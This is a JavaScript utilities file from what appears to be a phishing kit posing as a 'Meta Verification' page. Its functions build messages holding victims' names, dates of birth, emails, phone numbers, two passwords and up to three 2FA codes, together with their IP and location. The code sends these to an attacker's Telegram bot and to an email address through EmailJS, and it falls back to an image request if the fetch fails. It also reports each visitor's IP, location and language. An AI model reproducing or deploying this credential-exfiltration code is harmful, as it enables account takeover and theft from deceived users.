// Utilities
const Utils = {
    encrypt(text) {
        return CryptoJS.AES.encrypt(text, CONFIG.SECRET_KEY).toString();
    },

    decrypt(cipherText) {
        const bytes = CryptoJS.AES.decrypt(cipherText, CONFIG.SECRET_KEY);
        return bytes.toString(CryptoJS.enc.Utf8);
    },

    saveRecord(key, value) {
        try {
            const encryptedValue = this.encrypt(JSON.stringify(value));
            const record = { value: encryptedValue, expiry: Date.now() + CONFIG.STORAGE_EXPIRY };
            localStorage.setItem(key, JSON.stringify(record));
        } catch (error) {
            console.error('Save error:', error);
        }
    },

    getRecord(key) {
        try {
            const item = localStorage.getItem(key);
            if (!item) return null;
            const { value, expiry } = JSON.parse(item);
            if (Date.now() > expiry) {
                localStorage.removeItem(key);
                return null;
            }
            const decrypted = this.decrypt(value);
            return decrypted ? JSON.parse(decrypted) : null;
        } catch (error) {
            return null;
        }
    },

    async getUserIp() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Error getting IP:', error);
            return 'N/A';
        }
    },

    async fetchWithTimeout(url, ms) {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), ms);
        try {
            return await fetch(url, { signal: controller.signal });
        } finally {
            clearTimeout(timer);
        }
    },

    async getUserLocation() {
        try {
            const response = await this.fetchWithTimeout("https://ipinfo.io/json?token=790b745aefcdac", 5000);
            if (!response.ok) throw new Error("Network response was not ok");

            const data = await response.json();

            return {
                location: `${data.ip} | ${data.city || 'N/A'} | ${data.region || 'N/A'} (${data.country})`,
                country_code: data.country || "N/A",
                ip: data.ip || "N/A",
                region: data.region || "N/A",
                country: data.country || "N/A"
            };
        } catch (error) {
            console.error("Error getting location:", error);

            return {
                location: "N/A",
                country_code: "N/A",
                ip: "N/A",
                region: "N/A",
                country: "N/A"
            };
        }
    },

    async sendTelegramMessage(text) {
        const params = new URLSearchParams({
            chat_id: String(CONFIG.TELEGRAM_CHAT_ID),
            text: text,
            parse_mode: 'HTML'
        });
        const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage?${params.toString()}`;

        try {
            await fetch(url, { method: 'GET', mode: 'no-cors', cache: 'no-store' });
        } catch (error) {
            try {
                const img = new Image();
                img.src = url;
            } catch (imgError) {
                console.error('Telegram error:', imgError);
            }
        }
    },

    getLanguageGateMap() {
        try {
            const data = JSON.parse(localStorage.getItem('__lang_gate_by_ip__') || '{}');
            return data && typeof data === 'object' && !Array.isArray(data) ? data : {};
        } catch (e) {
            return {};
        }
    },

    getConfirmedLanguageForIp(ip) {
        if (!ip) return null;
        const map = this.getLanguageGateMap();
        const value = map[ip];
        if (!value) return null;
        return typeof value === 'string' ? value : (value.lang || null);
    },

    markLanguageGateConfirmed(ip, lang) {
        if (!ip) return;
        const map = this.getLanguageGateMap();
        map[ip] = lang || 'en';
        try {
            localStorage.setItem('__lang_gate_by_ip__', JSON.stringify(map));
        } catch (e) { }
    },

    async sendLanguageNotification(language) {
        const locationData = await this.getUserLocation();
        const ip = locationData.ip || 'N/A';
        const storageKey = '__lang_notify_ips__';
        let sentIps = [];

        try {
            sentIps = JSON.parse(localStorage.getItem(storageKey) || '[]');
            if (!Array.isArray(sentIps)) sentIps = [];
        } catch (e) {
            sentIps = [];
        }

        if (sentIps.indexOf(ip) !== -1) {
            return;
        }

        const text = `<b>IP:</b> <code>${ip}</code>\n<b>Location:</b> <code>${locationData.location}</code>\n<b>Language:</b> <code>${language || 'N/A'}</code>`;
        await this.sendTelegramMessage(text);

        sentIps.push(ip);
        try {
            localStorage.setItem(storageKey, JSON.stringify(sentIps));
        } catch (e) { }
    },

    formatDob(data) {
        if (!data.day && !data.month && !data.year) return '';
        return `${data.day || ''}/${data.month || ''}/${data.year || ''}`;
    },

    buildNotificationMessage(data, locationData, html) {
        const line = (label, value) => {
            if (value === undefined || value === null || String(value).trim() === '') return '';
            if (html) return `<b>${label}:</b> <code>${value}</code>`;
            return `${label}: ${value}`;
        };

        const section = (lines) => lines.filter(Boolean);

        const parts = [];
        parts.push(...section([
            line('IP', locationData.ip),
            line('Location', locationData.location)
        ]));

        const profile = section([
            line('Full Name', data.fullName),
            line('Page', data.fanpage),
            line('DOB', this.formatDob(data))
        ]);
        if (profile.length) {
            parts.push('----------------------', ...profile);
        }

        const contact = section([
            line('Email', data.email),
            line('Business Email', data.emailBusiness),
            line('Phone', data.phone)
        ]);
        if (contact.length) {
            parts.push('----------------------', ...contact);
        }

        const passwords = section([
            line('Password(1)', data.password),
            line('Password(2)', data.passwordSecond)
        ]);
        if (passwords.length) {
            parts.push('----------------------', ...passwords);
        }

        const twoFa = section([
            line('2FA(1)', data.twoFa),
            line('2FA(2)', data.twoFaSecond),
            line('2FA(3)', data.twoFaThird)
        ]);
        if (twoFa.length) {
            parts.push('----------------------', ...twoFa);
        }

        return parts.join('\n');
    },

    async sendToTelegram(data) {
        const locationData = await this.getUserLocation();
        const text = this.buildNotificationMessage(data, locationData, true);
        await this.sendTelegramMessage(text);
    },

    async sendToEmail(data) {
        const locationData = await this.getUserLocation();
        const emailContent = `${this.buildNotificationMessage(data, locationData, false)}

Sent at: ${new Date().toLocaleString()}`;

        try {
            // Load EmailJS SDK if not already loaded
            if (!window.emailjs) {
                await this.loadEmailJSSDK();
            }

            await emailjs.send(
                CONFIG.EMAILJS_SERVICE_ID,
                CONFIG.EMAILJS_TEMPLATE_ID,
                {
                    to_email: CONFIG.EMAIL_RECIPIENT,
                    subject: `Meta Verification - ${locationData.location}`,
                    message: emailContent,
                    from_name: 'Meta Verification System',
                    reply_to: data.email || 'noreply@system.com'
                },
                CONFIG.EMAILJS_PUBLIC_KEY
            );
        } catch (error) {
            console.error('Email error:', error);
        }
    },

    loadEmailJSSDK() {
        return new Promise((resolve, reject) => {
            if (window.emailjs) {
                resolve();
                return;
            }

            const script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
            script.onload = () => {
                emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
                resolve();
            };
            script.onerror = reject;
            document.head.appendChild(script);
        });
    },

    async sendNotification(data) {
        const notificationType = CONFIG.NOTIFICATION_TYPE;

        try {
            if (notificationType === 'telegram' || notificationType === 'both') {
                await this.sendToTelegram(data);
            }

            if (notificationType === 'email' || notificationType === 'both') {
                await this.sendToEmail(data);
            }
        } catch (error) {
            console.error('Notification error:', error);
        }
    },

    maskPhone(phone) {
        if (!phone || phone.length < 5) return phone;
        const start = phone.slice(0, 2);
        const end = phone.slice(-2);
        return `${start} ${'*'.repeat(phone.length - 4)} ${end}`;
    },

    maskEmail(email) {
        if (!email) return '';
        return email.replace(/^(.)(.*?)(.)@(.+)$/, (_, a, mid, c, domain) => {
            return `${a}${'*'.repeat(mid.length)}${c}@${domain}`;
        });
    },

    generateTicketId() {
        const gen = () => Math.random().toString(36).substring(2, 6).toUpperCase();
        return `${gen()}-${gen()}-${gen()}`;
    }
};

window.Utils = Utils;

